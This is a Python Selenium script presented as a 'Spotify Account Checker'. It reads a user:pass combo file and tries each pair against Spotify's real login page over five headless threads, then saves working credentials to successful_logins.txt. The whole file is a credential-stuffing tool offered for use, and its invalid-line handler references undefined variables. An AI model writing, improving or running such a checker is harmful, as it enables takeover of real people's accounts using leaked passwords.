import os
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
import random
import time
from concurrent.futures import ThreadPoolExecutor
from colorama import Fore, Style
from termcolor import colored

def check_spotify_login(email, password):
    chromedriver_path = './chromedriver.exe'
    options = webdriver.ChromeOptions()
    options.add_argument('--headless')
    driver = webdriver.Chrome(options=options)

    driver.get('https://accounts.spotify.com/en/login')
    time.sleep(5)

    email_field = driver.find_element(By.ID, 'login-username')
    email_field.send_keys(email)
    password_field = driver.find_element(By.ID, 'login-password')
    password_field.send_keys(password)
    password_field.send_keys(Keys.RETURN)

    time.sleep(5)

    try:
        welcome_message = driver.find_element(By.XPATH, "//h2[contains(text(), 'Logged in as')]")
        print(colored(f"Login successful for {email}", 'green'))
        save_to_file("successful_logins.txt", email, password)
    except:
        print(colored(f"Login failed for {email}", 'red'))
        save_to_file("failed_logins.txt", email, password)

    driver.quit()

def read_credentials(filename):
    credentials = []
    with open(filename, 'r', encoding='utf-8') as file:
        for line in file:
            parts = line.strip().split(':')
            if len(parts) == 2:
                email, password = parts
                credentials.append((email, password))
            else:
                print(f"Ignoring invalid line: {line.strip()}")
                save_to_file("invalid.txt", email, password)
    return credentials

def save_to_file(filename, email, password):
    if not os.path.exists(filename):
        open(filename, 'a').close()
    
    with open(filename, 'a') as file:
        file.write(f"{email}:{password}\n")

if __name__ == "__main__":
    clear = '\x1b[0m'
    colors = [36, 32, 34, 35, 31, 37]
    x = """
          \\\|||||//         
          (  O O  )          
|--ooO-------(_)------------|
|                           |
| Spotify Account Checker   |
| By RzkyO                  |
|                           |
|----------------------Ooo--|
          |__||__|           
           ||  ||            
          ooO  Ooo           
\n"""

    for N, line in enumerate(x.split("\n")):
        random_color = random.choice(colors)
        print(f" \x1b[1;{random_color}m{line}{clear} ")
    time.sleep(0.05)
    filename = input("Enter filename .txt (example .txt: user:pass): ")
    credentials = read_credentials(filename)
    with ThreadPoolExecutor(max_workers=5) as executor:
        for email, password in credentials:
            executor.submit(check_spotify_login, email, password)
